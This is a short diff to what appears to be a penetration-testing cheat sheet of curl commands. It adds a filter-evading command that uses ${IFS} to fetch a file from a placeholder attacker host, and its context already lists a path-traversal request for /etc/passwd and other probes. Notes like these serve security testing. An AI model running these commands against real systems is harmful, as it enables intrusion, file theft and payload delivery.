@@ -423,6 +423,7 @@ $ curl -I POST http://<DOMAIN>
 $ curl -X PUT http://<DOMAIN>
 $ curl --path-as-is http://<DOMAIN>/../../../../../../etc/passwd
 $ curl -s "http://<DOMAIN>/reports.php?report=2589" | grep Do -A8 | html2text
+$ curl${IFS}<LHOST>/<FILE>
 ```
 
 ### Headers
